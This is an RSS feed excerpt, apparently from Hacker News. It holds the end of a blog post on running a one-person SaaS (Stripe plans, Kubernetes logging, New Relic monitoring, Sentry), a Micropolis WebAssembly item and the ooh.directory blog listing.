<p><span><img src="https://anthonynsimon.com/img/blog/one-man-saas-architecture/panelbear-billing-portal-stripe.png" alt="Panelbear's Customer Billing Portal" width="100%" height="auto" loading="lazy"></span>
<em>An example Customer Billing Portal in Panelbear.</em></p>
<p>All I have to do is create a new customer session and redirect the customer to one of Stripe's hosted pages. I then listen for webhooks about whether the customer upgraded/downgraded/cancelled and update my database accordingly.</p>
<p>Of course there's a few important parts like validating that the webhook really came from Stripe (you have to validate the request signature with a secret), but Stripe's documentation covers all the points really well.</p>
<p>I only have a few plans, so it's pretty easy for me to manage them in my codebase. I essentially have something like:</p>
<pre><div><pre><code><span># Plan constants</span><span>
</span><span>FREE </span><span>=</span><span> Plan</span><span>(</span><span>
</span><span>  code</span><span>=</span><span>'free'</span><span>,</span><span>
</span><span>  display_name</span><span>=</span><span>'Free Plan'</span><span>,</span><span>
</span><span>  features</span><span>=</span><span>{</span><span>'abc'</span><span>,</span><span> </span><span>'xyz'</span><span>}</span><span>,</span><span>
</span><span>  monthly_usage_limit</span><span>=</span><span>5e3</span><span>,</span><span>
</span><span>  max_alerts</span><span>=</span><span>1</span><span>,</span><span>
</span><span>  stripe_price_id</span><span>=</span><span>'...'</span><span>,</span><span>
</span><span></span><span>)</span><span>
</span>
<span>BASIC </span><span>=</span><span> Plan</span><span>(</span><span>
</span><span>  code</span><span>=</span><span>'basic'</span><span>,</span><span>
</span><span>  display_name</span><span>=</span><span>'Basic Plan'</span><span>,</span><span>
</span><span>  features</span><span>=</span><span>{</span><span>'abc'</span><span>,</span><span> </span><span>'xyz'</span><span>}</span><span>,</span><span>
</span><span>  monthly_usage_limit</span><span>=</span><span>50e3</span><span>,</span><span>
</span><span>  max_alerts</span><span>=</span><span>5</span><span>,</span><span>
</span><span>  stripe_price_id</span><span>=</span><span>'...'</span><span>,</span><span>
</span><span></span><span>)</span><span>
</span>
<!-- -->
<span>PREMIUM </span><span>=</span><span> Plan</span><span>(</span><span>
</span><span>  code</span><span>=</span><span>'premium'</span><span>,</span><span>
</span><span>  display_name</span><span>=</span><span>'Premium Plan'</span><span>,</span><span>
</span><span>  features</span><span>=</span><span>{</span><span>'abc'</span><span>,</span><span> </span><span>'xyz'</span><span>,</span><span> </span><span>'special-feature'</span><span>}</span><span>,</span><span>
</span><span>  monthly_usage_limit</span><span>=</span><span>250e3</span><span>,</span><span>
</span><span>  max_alerts</span><span>=</span><span>25</span><span>,</span><span>
</span><span>  stripe_price_id</span><span>=</span><span>'...'</span><span>,</span><span>
</span><span></span><span>)</span><span>
</span>
<span></span><span># Helpers for easy access</span><span>
</span><span>ALL_PLANS </span><span>=</span><span> </span><span>[</span><span>FREE</span><span>,</span><span> BASIC</span><span>,</span><span> PREMIUM</span><span>]</span><span>
</span><span>PLANS_BY_CODE </span><span>=</span><span> </span><span>{</span><span>p</span><span>.</span><span>code</span><span>:</span><span> p </span><span>for</span><span> p </span><span>in</span><span> ALL_PLANS</span><span>}</span></code></pre></div></pre>
<p>I can then use it in any API endpoint, cron job and admin task to determine which limits/features apply for a given customer. The current plan for a given customer is a column called <code>plan_code</code> on a <code>BillingProfile</code> model. I separate the user from the billing information since I'm planning to add organizations/teams at some point, and that way I can easily migrate the BillingProfile to the account owner / admin user.</p>
<p>Of course this model won't scale if you're offering thousands of individual products in an e-commerce shop, but it works pretty well for me since a SaaS usually only has a few plans.</p>
<h2 id="logging">Logging</h2>
<p>I don’t need to instrument my code with any logging agent or anything like that. I simply log to stdout and Kubernetes automatically collects, and rotates logs for me. I could also automatically ship those logs to something like Elasticsearch/Kibana using <a href="https://fluentbit.io/" rel="noopener" target="_blank">FluentBit</a>, but I don’t do that yet to keep things simple.</p>
<p>To inspect the logs I use <a href="https://github.com/wercker/stern" rel="noopener" target="_blank">stern</a>, a tiny CLI tool for Kubernetes that makes it super easy to tail application logs across multiple pods.
For example, <code>stern -n ingress-nginx</code> would tail the access logs for my nginx pods even across multiple nodes.</p>
<h2 id="monitoring-and-alerting">Monitoring and alerting</h2>
<p>In the beginning I used a self-hosted Prometheus / Grafana to automatically monitor my cluster and application metrics. However, I didn’t feel comfortable self-hosting my monitoring stack, because if something went wrong in the cluster, my alerting system would go down with it too (not great).</p>
<p>If there’s one thing that should never go down is your monitoring system, otherwise you’re essentially flying without instruments. That’s why I swapped my monitoring / alerting system with a hosted service (<a href="http://newrelic.com/" rel="noopener" target="_blank">New Relic</a>).</p>
<p>All my services have a Prometheus integration that automatically records and forwards the metrics to a compatible backend, such as Datadog, New Relic, Grafana Cloud or a self-hosted Prometheus instance (what I used to do). To migrate to New Relic, all I had to do was to use their Prometheus Docker image, and shutdown the self-hosted monitoring stack.</p>
<p><span><img src="https://anthonynsimon.com/img/blog/one-man-saas-architecture/panelbear-newrelic-monitoring.png" alt="Panelbear New Relic Dashboard" width="100%" height="auto" loading="lazy"></span>
<em>Example New Relic dashboard with a summary of the most important stats.</em></p>
<p><span><img src="https://anthonynsimon.com/img/blog/one-man-saas-architecture/panelbear-newrelic-uptime.png" alt="Panelbear New Relic Uptime Monitoring" width="100%" height="auto" loading="lazy"></span>
<em>I also monitor uptime around the world using New Relic's probes.</em></p>
<p>The migration from a self-hosted Grafana/Loki/Prometheus stack to New Relic reduced my operational surface. More importantly, I'd still get alerted even if my AWS region is down.</p>
<p>You might be wondering how I expose metrics from my Django app. I leverage the excellent <a href="https://github.com/korfuri/django-prometheus" rel="noopener" target="_blank">django-prometheus</a> library, and simply register a new counter/gauge in my application:</p>
<pre><div><pre><code><span>from</span><span> prometheus_client </span><span>import</span><span> Counter
</span>
<span>EVENTS_WRITTEN </span><span>=</span><span> Counter</span><span>(</span><span>
</span><span> </span><span>"events_total"</span><span>,</span><span>
</span><span> </span><span>"Total number of events written to the eventstore"</span><span>
</span><span></span><span>)</span><span>
</span>
<span></span><span># We can increment the counter to record the number of events</span><span>
</span><span></span><span># being written to the eventstore (ClickHouse)</span><span>
</span><span>EVENTS_WRITTEN</span><span>.</span><span>incr</span><span>(</span><span>count</span><span>)</span></code></pre></div></pre>
<p>It will expose this and other metrics in the <code>/metrics</code> endpoint of my server (only reachable within my cluster). Prometheus will automatically scrape this endpoint every minute and forward the metrics to New Relic.</p>
<p><span><img src="https://anthonynsimon.com/img/blog/one-man-saas-architecture/prometheus-metric-in-newrelic.png" alt="Prometheus metrics" width="100%" height="auto" loading="lazy"></span>
<em>The metric automatically shows up in New Relic thanks to the Prometheus integration.</em></p>
<h2 id="error-tracking">Error tracking</h2>
<p>Everyone thinks they don’t have errors in their application, until they start error tracking. It’s too easy for an exception to get lost in logs, or worse you’re aware of it but unable to reproduce the problem due to lack of context.</p>
<p>I use <a href="https://sentry.io/" rel="noopener" target="_blank">Sentry</a> to aggregate and notify me about errors across my applications. Instrumenting my Django apps is very simple:</p>
<pre><div><pre><code><span>SENTRY_DSN </span><span>=</span><span> env</span><span>.</span><span>str</span><span>(</span><span>"SENTRY_DSN"</span><span>,</span><span> default</span><span>=</span><span>None</span><span>)</span><span>
</span>
<span></span><span># Init Sentry if configured</span><span>
</span><span></span><span>if</span><span> SENTRY_DSN</span><span>:</span><span>
</span><span> sentry_sdk</span><span>.</span><span>init</span><span>(</span><span>
</span><span>   dsn</span><span>=</span><span>SENTRY_DSN</span><span>,</span><span>
</span><span>   integrations</span><span>=</span><span>[</span><span>DjangoIntegration</span><span>(</span><span>)</span><span>,</span><span> RedisIntegration</span><span>(</span><span>)</span><span>,</span><span> CeleryIntegration</span><span>(</span><span>)</span><span>]</span><span>,</span><span>
</span><span>   </span><span># Do not send user PII data to Sentry</span><span>
</span><span>   </span><span># See also inbound rules for special patterns</span><span>
</span><span>   send_default_pii</span><span>=</span><span>False</span><span>,</span><span>
</span><span>   </span><span># Only sample a small amount of performance traces</span><span>
</span><span>   traces_sample_rate</span><span>=</span><span>env</span><span>.</span><span>float</span><span>(</span><span>"SENTRY_TRACES_SAMPLE_RATE"</span><span>,</span><span> default</span><span>=</span><span>0.008</span><span>)</span><span>,</span><span>
</span><span> </span><span>)</span></code></pre></div></pre>
<p>It’s been very helpful because it automatically collects a bunch of contextual information about what happened when the exception occurred:</p>
<p><span><img src="https://anthonynsimon.com/img/blog/one-man-saas-architecture/panelbear-sentry-error-tracking.png" alt="Panelbear Sentry error tracking" width="100%" height="auto" loading="lazy"></span>
<em>Sentry aggregates and notifies me in case of exceptions.</em></p>
<p>I use a Slack <code>#alerts</code> channel to centralize all my alerts: downtime, cron job failures, security alerts, performance regressions, application exceptions, and whatnot. It's great because I can often correlate issues when multiple services ping me around the same time, on seemingly unrelated problems.</p>
<p><span><img src="https://anthonynsimon.com/img/blog/one-man-saas-architecture/panelbear-slack-alerts-channel.png" alt="Panelbear Slack alerts channel" width="100%" height="auto" loading="lazy"></span>
<em>Example Slack alert due to a CDN endpoint being down in Sydney, Australia.</em></p>
<h2 id="profiling-and-other-goodies">Profiling and other goodies</h2>
<p>When I need to deep dive, I also use tools like <a href="https://docs.python.org/3/library/profile.html" rel="noopener" target="_blank">cProfile</a> and <a href="https://jiffyclub.github.io/snakeviz/" rel="noopener" target="_blank">snakeviz</a> to better understand allocations, number of calls and other stats about my app’s performance. Sounds fancy but they’re pretty easy to use tools, and have helped me identify various issues in the past that made my dashboards slow from seemingly unrelated code.</p>
<p><span><img src="https://anthonynsimon.com/img/blog/one-man-saas-architecture/panelbear-cprofile-snakeviz.jpeg" alt="Panelbear New Relic Uptime Monitoring" width="100%" height="auto" loading="lazy"></span>
<em>cProfile and snakeviz are great tools to profile your Python code locally.</em></p>
<p>I also use the <a href="https://django-debug-toolbar.readthedocs.io/en/latest/" rel="noopener" target="_blank">Django debug toolbar</a> on my local machine to easily inspect the queries that a view triggers, preview outgoing emails during development, and many other goodies.</p>
<p><span><img src="https://anthonynsimon.com/img/blog/one-man-saas-architecture/panelbear-django-debug-toolbar.png" alt="Panelbear New Relic Uptime Monitoring" width="100%" height="auto" loading="lazy"></span>
<em>Django's Debug Toolbar is great for inspecting stuff in local dev, and previewing transactional emails.</em></p>
<h2 id="thats-all-folks">That's all folks</h2>
<p>I hope you enjoyed this post if you've made it this far. It ended up being a lot longer than I originally intended as there was a lot of ground to cover.</p>
<p>If you're not already familiar with these tools consider using a managed platform first, for example Render or Railway. This might help you focus on your product, and still gain many of the benefits I talk about here.</p>
<p>"Do you use Kubernetes for everything?" - No, different projects, different needs. For example this blog is hosted on <a href="https://vercel.com/" rel="noopener" target="_blank">Vercel</a>.</p>
<p>That said, I do intend to write more follow up posts on specific tips and tricks, and share more lessons learned along the way.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[SimCity in the web browser using WebAssembly and OpenGL (232 pts)]]></title>
            <link>https://micropolisweb.com/</link>
            <guid>40693944</guid>
            <pubDate>Sun, 16 Jun 2024 01:12:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://micropolisweb.com/">https://micropolisweb.com/</a>, See on <a href="https://news.ycombinator.com/item?id=40693944">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><b>This is Micropolis in WebAssembly!</b><br> Based on the original SimCity sources,<br> designed by Will Wright, ported by Don Hopkins.<br> GitHub: <a target="_new" href="https://github.com/SimHacker/MicropolisCore">https://github.com/SimHacker/MicropolisCore</a><br> YouTube: <a target="_new" href="https://www.youtube.com/watch?v=wlHGfNlE8Os">"MicropolisWeb Demo 1"</a><br> More Info: <a target="_new" href="https://mitpress.mit.edu/9780262547482/building-simcity/">Chaim Gingold's book "Building SimCity"</a><br> and <a target="_new" href="https://smalltalkzoo.thechm.org/users/Dan/uploads/SimCityReverseDiagrams.pdf">Chaim Gingold's "SimCity Reverse Diagrams"</a>.<br> Left button drag to pan, mouse wheel to zoom.<br> Arrow keys pan, comma and period zoom. <br> Letter keys load various cities, tab to generate.<br> Numeric keys set the speed, 0 toggles pause.<br> The brackets lower and raise the tax rate.<br> <em>WARNING: DO NOT hit the space bar,<br> because that will open up the <a target="_new" href="https://www.youtube.com/watch?v=WPMeWas4kXM">Space Inventory</a><br></em></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A collection of 2,299 blogs about every topic (117 pts)]]></title>
            <link>https://ooh.directory/</link>
            <guid>40693787</guid>
            <pubDate>Sun, 16 Jun 2024 00:42:05 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ooh.directory/">https://ooh.directory/</a>, See on <a href="https://news.ycombinator.com/item?id=40693787">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="main">
<div>
<ol>
<li>

<span>
<a href="https://ooh.directory/blogs/arts/">Arts and media</a>
<small>(883)</small>
<ul>
<li><a href="https://ooh.directory/blogs/arts/architecture/">Architecture</a></li>
<li><a href="https://ooh.directory/blogs/arts/books/">Books</a></li>
<li><a href="https://ooh.directory/blogs/arts/design/">Design</a></li>
<li><a href="https://ooh.directory/blogs/arts/games/">Games</a></li>
<li><a href="https://ooh.directory/blogs/arts/music/">Music</a></li>
</ul>
</span>
</li>
<li>

<span>
<a href="https://ooh.directory/blogs/technology/">Computers, internet, tech</a>
<small>(381)</small>
<ul>
<li><a href="https://ooh.directory/blogs/technology/hardware/">Hardware</a></li>
<li><a href="https://ooh.directory/blogs/technology/internet/">Internet</a></li>
<li><a href="https://ooh.directory/blogs/technology/development/web/">Web development</a></li>
</ul>
</span>
</li>
<li>

<span>
<a href="https://ooh.directory/blogs/countries/">Countries, states, towns, etc.</a>
<small>(121)</small>
<ul>
<li><a href="https://ooh.directory/blogs/countries/uk/london/">London</a></li>
<li><a href="https://ooh.directory/blogs/countries/uk/">UK</a></li>
<li><a href="https://ooh.directory/blogs/countries/usa/">USA</a></li>
</ul>
</span>
</li>
<li>

<span>
<a href="https://ooh.directory/blogs/economics/">Economics and business</a>
<small>(80)</small>
<ul>
<li><a href="https://ooh.directory/blogs/economics/companies/bbc/">BBC</a></li>
<li><a href="https://ooh.directory/blogs/economics/economics/">Economics</a></li>
<li><a href="https://ooh.directory/blogs/economics/business/management/">Management</a></li>
</ul>
</span>
</li>
<li>

<span>
<a href="https://ooh.directory/blogs/education/">Education</a>
<small>(38)</small>
</span>
</li>
<li>

<span>
<a href="https://ooh.directory/blogs/politics/">Government, politics and law</a>
<small>(59)</small>
<ul>
<li><a href="https://ooh.directory/blogs/politics/law/">Law</a></li>
<li><a href="https://ooh.directory/blogs/politics/military/">Military</a></li>
<li><a href="https://ooh.directory/blogs/politics/politics/">Politics</a></li>
</ul>
</span>
</li>
<li>

<span>
<a href="https://ooh.directory/blogs/humanities/">Humanities</a>
<small>(167)</small>
<ul>
<li><a href="https://ooh.directory/blogs/humanities/futures/">Futures</a></li>
<li><a href="https://ooh.directory/blogs/humanities/geography/">Geography</a></li>
<li><a href="https://ooh.directory/blogs/humanities/history/">History</a></li>
<li><a href="https://ooh.directory/blogs/humanities/language/">Language</a></li>
</ul>
</span>
</li>
<li>

<span>
<a href="https://ooh.directory/blogs/personal/">Personal blogs</a>
<small>(358)</small>
</span>
</li>
<li>

<span>
<a href="https://ooh.directory/blogs/recreation/">Recreation</a>
<small>(239)</small>
<ul>
<li><a href="https://ooh.directory/blogs/recreation/food-and-drink/">Food &amp; drink</a></li>
<li><a href="https://ooh.directory/blogs/recreation/sport/">Sport &amp; exercise</a></li>
<li><a href="https://ooh.directory/blogs/recreation/travel/">Travel</a></li>
</ul>
</span>
</li>
<li>

<span>
<a href="https://ooh.directory/blogs/science/">Science</a>
<small>(141)</small>
<ul>
<li><a href="https://ooh.directory/blogs/science/earth-science/">Earth science</a></li>
<li><a href="https://ooh.directory/blogs/science/mathematics/">Mathematics</a></li>
<li><a href="https://ooh.directory/blogs/science/space/">Space</a></li>
</ul>
</span>
</li>
<li>

<span>
<a href="https://ooh.directory/blogs/society/">Society</a>
<small>(44)</small>
<ul>
<li><a href="https://ooh.directory/blogs/society/death-graves/">Death &amp; graves</a></li>
<li><a href="https://ooh.directory/blogs/society/psychogeography/">Psychogeography</a></li>
<li><a href="https://ooh.directory/blogs/society/religion/">Religion</a></li>
</ul>
</span>
</li>
<li>

<span>
<a href="https://ooh.directory/blogs/uncategorizable/">Uncategorizable blogs</a>
<small>(41)</small>
<ul>
<li><a href="https://ooh.directory/blogs/uncategorizable/completionists/">Completionist blogs</a></li>
</ul>
</span>
</li>
</ol>
</div>
<div>
<h2>Recently added blogs</h2>
<p>Or see <a href="https://ooh.directory/updated/">recently <em>updated</em> blogs</a></p>
<ol>
<li>
<p>
<a href="https://www.holdfastbespoke.com/blog-3-1">Hold Fast Bespoke Blog</a>
<img src="https://ooh.directory/static/oohdir/img/new.gif" alt="NEW" width="31" height="12">
<br>
<q>Stay abreast of what's happening in my midcoast Maine workroom. This is where I share a glimpse into the world of bespoke tailoring.</q>
<span>
<span>
<span aria-label="United States of America" title="United States of America">🇺🇸</span>
</span>
<a href="https://ooh.directory/blog/7je9j6/">More info</a>
</span>
</p>
<details>
<summary>
Updated <time datetime="2024-05-27T16:27:30+00:00">2 weeks ago</time>
</summary>
<div>
<figure>
<figcaption>
<a href="https://www.holdfastbespoke.com/blog-3-1/hold-fast-classic-tweed-overcoat">Hold Fast Classic Tweed Overcoat</a>
</figcaption>
<blockquote cite="https://www.holdfastbespoke.com/blog-3-1/hold-fast-classic-tweed-overcoat">
Classic Fabric / Classic Style This wool tweed rendition of the Hold Fast Balmacaan is, in my opinion, timeless. Tailored in collaboration with David Wood Clothiers of Portland, Maine; it will never go out of …
</blockquote>

</figure>
</div> 
</details>
</li>
<li>
<p>
<a href="https://blakegopnik.com/">BLAKE GOPNIK on art</a>
<img src="https://ooh.directory/static/oohdir/img/new.gif" alt="NEW" width="31" height="12">
<br>
<span>
<span>
<span aria-label="United States of America" title="United States of America">🇺🇸</span>
</span>
<a href="https://ooh.directory/blog/6py4p6/">More info</a>
</span>
</p>
<details>
<summary>
Updated <time datetime="2024-06-14T17:58:53+00:00">a day ago</time>
</summary>
<div>
<figure>
<figcaption>
<a href="https://blakegopnik.com/post/753284345668747264">THE FRIDAY PIC is a photo by Stephen Shore titled “Kingston, New York, November 8, 2020, …</a>
</figcaption>
<blockquote cite="https://blakegopnik.com/post/753284345668747264">
THE FRIDAY PIC is a photo by Stephen Shore titled “Kingston, New York, November 8, 2020, 41°56.9443167N, 74°1.7406167W.” (I love all that specificity.) The image is from Shore’s fabulous new show of photographs shot from …
</blockquote>

</figure>
</div> 
</details>
</li>
<li>
<p>
<a href="https://mleddy.blogspot.com/">Orange Crate Art</a>
<img src="https://ooh.directory/static/oohdir/img/new.gif" alt="NEW" width="31" height="12">
<br>
<q>“It goes idea by idea”.</q>
By Michael Leddy.
<span>
<span>
<span aria-label="United States of America" title="United States of America">🇺🇸</span>
</span>
<a href="https://ooh.directory/blog/8v35v6/">More info</a>
</span>
</p>
<details>
<summary>
Updated <time datetime="2024-06-15T22:06:00+00:00">12 hours ago</time>
</summary>
<div>
<figure>
<figcaption>
<a href="https://mleddy.blogspot.com/2024/06/trumps-bing.html">Trump’s “bing”</a>
</figcaption>
<blockquote cite="https://mleddy.blogspot.com/2024/06/trumps-bing.html">
It's a small thing, but I think I've discovered the source for Trump's strange "bing" habit. Here is a compilation or Trump moments. And here — wait for it — is Joe Pesci in Goodfellas. …
</blockquote>

</figure>
</div> 
</details>
</li>
<li>
<p>
<a href="https://saintjohnswort.ca/">St. John's Wort</a>
<img src="https://ooh.directory/static/oohdir/img/new.gif" alt="NEW" width="31" height="12">
<br>
<q>Beery Musings And Amusing Beers.</q>
By Jordan St. John.
<span>
<span>
<span aria-label="Canada" title="Canada">🇨🇦</span>
</span>
<a href="https://ooh.directory/blog/8nmqr6/">More info</a>
</span>
</p>
<details>
<summary>
Updated <time datetime="2024-05-21T12:56:17+00:00">3 weeks ago</time>
</summary>
<div>
<figure>
<figcaption>
<a href="https://saintjohnswort.ca/the-second-wedge-zivotni-czech-style-lager/">The Second Wedge&nbsp;Životní Czech Style Lager</a>
</figcaption>
<blockquote cite="https://saintjohnswort.ca/the-second-wedge-zivotni-czech-style-lager/">
It seems odd to write about a beer that’s almost gone. Usually when I write about a collaboration beer, I do it a couple of weeks before it comes out because the brewing process is …
</blockquote>

</figure>
</div> 
</details>
</li>
<li>
<p>
<a href="https://hitarththummar.xyz/posts/">ht.xyz - Blog posts</a>
<img src="https://ooh.directory/static/oohdir/img/new.gif" alt="NEW" width="31" height="12">
<br>
<q>I'm passionate about creativity, storytelling, and technology, and this website is my nook on the internet to express that passion.</q>
By Hitarth Thummar.
<span>
<span>
<span aria-label="India" title="India">🇮🇳</span>
</span>
<a href="https://ooh.directory/blog/89yrw7/">More info</a>
</span>
</p>
<details>
<summary>
Updated <time datetime="2024-05-20T00:00:00+00:00">3 weeks ago</time>
</summary>
<div>
<figure>
<figcaption>
<a href="https://hitarththummar.xyz/posts/goodbye_copilot">Goodbye Copilot, it was fun while it lasted.</a>
</figcaption>
<blockquote cite="https://hitarththummar.xyz/posts/goodbye_copilot">
I have been using GitHub Copilot for the past few months now, and honestly it is pretty fun. It felt like the kind of racy relationship that keeps giving you adrenaline every waking moment of …
</blockquote>

</figure>
</div> 
</details>
</li>
<li>
<p>
<a href="https://lord.technology/">Jamie Lord</a>
<img src="https://ooh.directory/static/oohdir/img/new.gif" alt="NEW" width="31" height="12">
<br>
<q>Solution Architect at CDS, based in Nottingham, UK, using Azure and C# to build awesome projects.</q>
<span>
<span>
<span aria-label="United Kingdom" title="United Kingdom">🇬🇧</span>
</span>
<a href="https://ooh.directory/blog/84pwg8/">More info</a>
</span>
</p>
<details>
<summary>
Updated <time datetime="2024-06-06T16:00:00+00:00">a week ago</time>
</summary>
<div>
<figure>
<figcaption>
<a href="https://lord.technology/2024/06/06/the-ai-dilemma-balancing-rapid-advancement-and-organisational-readiness.html">The AI Dilemma: Balancing Rapid Advancement and Organisational Readiness</a>
</figcaption>
<blockquote cite="https://lord.technology/2024/06/06/the-ai-dilemma-balancing-rapid-advancement-and-organisational-readiness.html">
As artificial intelligence continues to evolve at an astonishing rate, organisations find themselves at a critical juncture. The transformative potential of AI is undeniable, with breakthroughs in natural language processing, computer vision, and generative models …
</blockquote>

</figure>
</div> 
</details>
</li>
<li>
<p>
<a href="https://aows.co/blog">aows — black and white photography</a>
<br>
<q>Film &amp; Digital Monochrome Photography.</q>
By Adrian Vila.
<span>
<span>
<span aria-label="United States of America" title="United States of America">🇺🇸</span>
</span>
<a href="https://ooh.directory/blog/7r5ek8/">More info</a>
</span>
</p>
<details>
<summary>
Updated <time datetime="2024-06-15T21:02:57+00:00">13 hours ago</time>
</summary>
<div>
<figure>
<figcaption>
<a href="https://aows.co/blog/2024/6/15/alone">Alone</a>
</figcaption>
<blockquote cite="https://aows.co/blog/2024/6/15/alone">
Utah, September 2020. From the video Great Salt Lake: a photography adventure.
</blockquote>

</figure>
</div> 
</details>
</li>
<li>
<p>
<a href="https://www.inthemargins.ca/">Flashing Palely in the Margins</a>
<br>
<q>An epistolarian, anthropologist, urban explorer, and over-user of the discretionary comma.</q>
By Sameer Vasta.
<span>
<span>
<span aria-label="Canada" title="Canada">🇨🇦</span>
</span>
<a href="https://ooh.directory/blog/6kyvm7/">More info</a>
</span>
</p>
<details>
<summary>
Updated <time datetime="2024-05-23T16:45:00+00:00">3 weeks ago</time>
</summary>
<div>
<figure>
<figcaption>
<a href="https://www.inthemargins.ca/asparagus">Asparagus season</a>
</figcaption>
<blockquote cite="https://www.inthemargins.ca/asparagus">
There is an asparagus farm a stone’s throw away from our house, and every spring, I’m so thankful that it’s there. I didn’t grow up eating asparagus; it wasn’t something that was easily put in …
</blockquote>

</figure>
</div> 
</details>
</li>
<li>
<p>
<a href="https://silviamaggidesign.com/blog/">Silvia Maggi - Designer</a>
<br>
<q>I write about design, technology, their effects on our lives, photography, and more. I curate the inspiration series Design, Digested.</q>
<span>
<span>
<span aria-label="United Kingdom" title="United Kingdom">🇬🇧</span>
</span>
<a href="https://ooh.directory/blog/75pod8/">More info</a>
</span>
</p>
<details>
<summary>
Updated <time datetime="2024-06-06T12:13:25+00:00">a week ago</time>
</summary>
<div>
<figure>
<figcaption>
<a href="https://silviamaggidesign.com/design-digested/design-digested-55/">Design, Digested 55 – Decline of the user interface, accessibility overlays, rituals</a>
</figcaption>
<blockquote cite="https://silviamaggidesign.com/design-digested/design-digested-55/">
If you ever thought ageing is the reason why technology seems more complicated, read on. Also, a guide to live in harmony with the world. The decline of the user interface Software has never looked …
</blockquote>

</figure>
</div> 
</details>
</li>
<li>
<p>
<a href="https://pawelurbanek.com/blog">Paweł U.</a>
<br>
<q>Ruby on Rails Web Development Consultant Full Stack Blog.</q>
By Paweł Urbanek.
<span>
<span>
<span aria-label="Poland" title="Poland">🇵🇱</span>
</span>
<a href="https://ooh.directory/blog/73po36/">More info</a>
</span>
</p>
<details>
<summary>
Updated <time datetime="2024-06-11T07:36:01+00:00">5 days ago</time>
</summary>
<div>
<figure>
<figcaption>
<a href="https://pawelurbanek.com/mev-yul-huff-gas">How to Optimize MEV Arbitrage Smart Contract with Yul and Huff</a>
</figcaption>
<blockquote cite="https://pawelurbanek.com/mev-yul-huff-gas">
Minimizing gas usage directly impacts the profitability of your MEV bot. In this blog post, we will start with a straightforward but nonoptimal approach for swapping two UniswapV2 pairs and gradually improve it. We will …
</blockquote>

</figure>
</div> 
</details>
</li>
<li>
<p>
<a href="https://blog.ignaciobrasca.com/">Happiness Machines | Entries</a>
<br>
<q>Technical and not-so technical articles I write.</q>
By Ignacio Brasca.
<span>
<span>
<span aria-label="Argentina" title="Argentina">🇦🇷</span>
</span>
<a href="https://ooh.directory/blog/7y2v56/">More info</a>
</span>
</p>
<details>
<summary>
Updated <time datetime="2024-05-18T00:00:00+00:00">4 weeks ago</time>
</summary>
<div>
<figure>
<figcaption>
<a href="https://blog.ignaciobrasca.com/programming/2024/05/18/pointer-stack-math.html">Nand2Tetris: Stack Pointer Math</a>
</figcaption>
<blockquote cite="https://blog.ignaciobrasca.com/programming/2024/05/18/pointer-stack-math.html">
After spending several days grappling with the intricacies of the stack pointer in my Hack computer, I finally decided to consolidate my understanding in a post. This will be a concise guide, almost a cheatsheet, …
</blockquote>

</figure>
</div> 
</details>
</li>
<li>
<p>
<a href="https://pantsaflame.blogspot.com/">Pants On Fire</a>
<br>
<q>The questionable activities of William J. Denby and his band of grifters in the city of Kawartha Lakes, Ontario, Canada.</q>
<span>
<span>
<span aria-label="Canada" title="Canada">🇨🇦</span>
</span>
<a href="https://ooh.directory/blog/7ewzo7/">More info</a>
</span>
</p>
<details>
<summary>
Updated <time datetime="2024-06-14T21:33:00+00:00">a day ago</time>
</summary>
<div>
<figure>
<figcaption>
<a href="https://pantsaflame.blogspot.com/2024/06/return-of-kawartha-first-nation.html">Return of Kawartha First Nation?</a>
</figcaption>
<blockquote cite="https://pantsaflame.blogspot.com/2024/06/return-of-kawartha-first-nation.html">
First, I know that yesterday's post probably upset a number of you who don't like Publication Bancakes - it feels unfair to be unable to discuss things that are of significant concern to many in …
</blockquote>

</figure>
</div> 
</details>
</li>
<li>
<p>
<a href="https://blog.atmtxphoto.com/">atmtx photo blog</a>
<br>
<q>For the Love of Photography + Stories + Gear.</q>
By Andy.
<span>
<span>
<span aria-label="United States of America" title="United States of America">🇺🇸</span>
</span>
<a href="https://ooh.directory/blog/6m5nr8/">More info</a>
</span>
</p>
<details>
<summary>
Updated <time datetime="2024-06-16T03:13:13+00:00">7 hours ago</time>
</summary>
<div>
<figure>
<figcaption>
<a href="https://blog.atmtxphoto.com/2024/06/15/cow-competition/">Cow Competition</a>
</figcaption>
<blockquote cite="https://blog.atmtxphoto.com/2024/06/15/cow-competition/">
Cow Competition, Rodeo Austin – Austin, Texas Beyond the large arena and the past poultry and livestock displays are the cows, neatly arranged in multiple rows with metal dividers. They take up a significant part …
</blockquote>

</figure>
</div> 
</details>
</li>
<li>
<p>
<a href="https://shoegazing.com/">Shoegazing.com</a>
<br>
<q>One of the largest blogs in the world on quality shoes, mainly welted footwear. Articles on shoe care, shoe construction, buying guides and more.</q>
By Jesper Ingevaldsson.
<span>
<span>
<span aria-label="Sweden" title="Sweden">🇸🇪</span>
</span>
<a href="https://ooh.directory/blog/8xxvg8/">More info</a>
</span>
</p>
<details>
<summary>
Updated <time datetime="2024-06-14T18:56:23+00:00">a day ago</time>
</summary>
<div>
<figure>
<figcaption>
<a href="https://shoegazing.com/2024/06/14/the-tip-dont-use-waterproofing-spray-on-regular-smooth-leather/">The tip – Don’t use waterproofing spray on regular smooth leather</a>
</figcaption>
<blockquote cite="https://shoegazing.com/2024/06/14/the-tip-dont-use-waterproofing-spray-on-regular-smooth-leather/">
One of the most common mistakes done when it comes to shoe care, if one look at the population as a whole, is the use of waterproofing spray also on full grain smooth leather. Yes, …
</blockquote>

</figure>
</div> 
</details>
</li>
<li>
<p>
<a href="https://sevenoutoften.co.uk/">Seven Out Of Ten</a>
<br>
<q>A personal writing project about video games, music and other things I’m interested in.</q>
By Liam Richardson.
<span>
<a href="https://ooh.directory/blog/7q3my6/">More info</a>
</span>
</p>
<details>
<summary>
Updated <time datetime="2024-06-06T12:22:53+00:00">a week ago</time>
</summary>
<div>
<figure>
<figcaption>
<a href="https://sevenoutoften.co.uk/here-have-some-keigh-3-2024-predictions/">Here, have some Keigh-3 2024 predictions</a>
</figcaption>
<blockquote cite="https://sevenoutoften.co.uk/here-have-some-keigh-3-2024-predictions/">
This year’s Not-E3 marks the first time in over a decade that I’m not covering the conference in some capacity, professional or otherwise. On the one hand, I am extremely relieved (covering E3 was hard …
</blockquote>

</figure>
</div> 
</details>
</li>
</ol>
<p>
<a href="https://ooh.directory/added/?d=20240602133623">See more</a>, or see <a href="https://ooh.directory/updated/">recently <em>updated</em> blogs</a>
</p>
</div>
